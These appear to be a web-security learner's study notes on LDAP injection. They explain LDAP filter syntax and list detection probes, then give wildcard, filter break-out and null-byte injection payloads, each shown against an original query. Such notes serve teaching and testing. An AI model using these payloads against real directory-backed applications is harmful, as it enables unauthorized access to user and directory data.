---
layout: page
title:  "LDAP injections"
permalink: "ldap-injections.html"
tags: [security, web, injections]
summary: ""
---
## Introduction
* LDAP: Lightweight Directory Access Protocol
* Used to access directory services over a network. Directory: hierarchically organized data store
* Examples:
  * Microsoft ADAM (Active Directory Application Mode)
  * OpenLDAP
* Commonly used in intranet-base web applications
* Simple match conditions on the value of one attribute: `(username=greg)`
* Disjunctive queries: `(|(cn=searchterm)(sn=searchterm)(ou=searchterm))`
* Conjunctive queries: `(&(username=greg)(password=dumbpassword))`
* Not possible to retrieve different attributes than the query was intended to retrieve
* Rarely return informative error message: blind LDAP injection


## Detection
* Available informations: results returned, HTTP 500 error
* Differentiating between SQL and LDAP: wildcard character `*`
* Number of closing brackets: `)))))))))`. May break something else, so need to make sure we're dealing with LDAP before
* `cn` attribute (supported on all LDAP implementations):
  * `)(cn=*`
  * `*))(|(cn=*`
  * `*))%00`


## Injections
* Wildcard: `)(department=*)`
```
(|(department=London searchterm)(departement=Reading searchterm))       # Original query
(|(department=London)(department=*)(department=Reading)(department=*))  # Modified query
```
* If multiple search filters allowed (OpenLDAP for example): `*))(&(username=searchterm`
```
(&(username=searchterm)(department=London*))                 # Original query
(&(username=*))(&(username=searchterm)(department=London*))  # Modified query
```

* Null bytes comments: `*))%00`
```
(&(username=searchterm)(department=London*))      # Original query
(&(username=*)) [NULL byte](department=London*))  # Modified query. Everything after the null byte is ignored
```
